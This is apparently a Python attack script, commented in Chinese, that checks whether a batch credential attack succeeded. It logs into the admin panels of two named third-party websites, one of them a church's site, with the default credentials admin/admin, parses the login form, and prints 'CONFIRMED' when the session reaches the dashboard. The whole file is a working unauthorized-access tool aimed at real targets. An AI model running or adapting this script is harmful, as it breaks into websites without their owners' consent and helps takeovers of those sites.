#!/usr/bin/env python3
"""verify_hits_bf.py - 严格验证批量攻击命中
验证: cookie会话登录后访问后台页, 确认非登录页
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}

TARGETS = [
    ('downmagaz.net', '/admin.php', 'admin', 'admin'),
    ('easttacomachurchofchrist.org', '/admin/', 'admin', 'admin'),
]

def verify(dom, path, user, pw):
    print('=== %s %s %s/%s ===' % (dom, path, user, pw), flush=True)
    base = 'http://' + dom
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    def fetch(url, data=None):
        body = urllib.parse.urlencode(data).encode() if data else None
        headers = {**UA, 'Content-Type': 'application/x-www-form-urlencoded'} if data else UA
        try:
            r = opener.open(urllib.request.Request(url, data=body, headers=headers), timeout=15)
            return r.status, r.read(80000).decode('utf-8', 'ignore'), r.geturl()
        except urllib.error.HTTPError as e:
            return e.code, e.read(80000).decode('utf-8', 'ignore'), e.geturl()
        except Exception as e:
            return 0, repr(e)[:60], ''
    # 登录页
    st, b, fu = fetch(base + path)
    fields = re.findall(r'<input[^>]*name="([^"]+)"', b)
    m = re.search(r'<form[^>]*action="([^"]*)"', b, re.I)
    action = m.group(1) if m else path
    if not action.startswith('http'):
        action = base + (action if action.startswith('/') else '/' + action)
    uf = next((f for f in fields if f.lower() in ('username', 'user', 'name', 'admin', 'loginname', 'account')), None)
    pf = next((f for f in fields if 'pass' in f.lower() or 'pwd' in f.lower()), None)
    print('  login page: len=%d fields=%s action=%s' % (len(b), fields[:6], action[:60]), flush=True)
    if not uf or not pf:
        print('  no fields', flush=True)
        return
    # 登录
    data = {f: '' for f in fields}
    data[uf], data[pf] = user, pw
    st2, b2, fu2 = fetch(action, data)
    print('  login post: st=%d len=%d fu=%s' % (st2, len(b2), fu2[:70]), flush=True)
    # cookie访问后台
    st3, b3, fu3 = fetch(base + path)
    print('  after: st=%d len=%d fu=%s' % (st3, len(b3), fu3[:70]), flush=True)
    low3 = b3.lower()
    if 'logout' in low3 or '退出' in b3 or 'dashboard' in low3 or '欢迎' in b3 or 'admin/index' in fu3:
        print('  !!! CONFIRMED: admin/%s' % pw, flush=True)
    else:
        print('  NOT LOGGED (len=%d, marks=%s)' % (len(b3), [k for k in ['logout', '退出', 'dashboard', '欢迎', 'login'] if k in low3]), flush=True)
    print('', flush=True)

for t in TARGETS:
    verify(*t)
print('=== done ===')
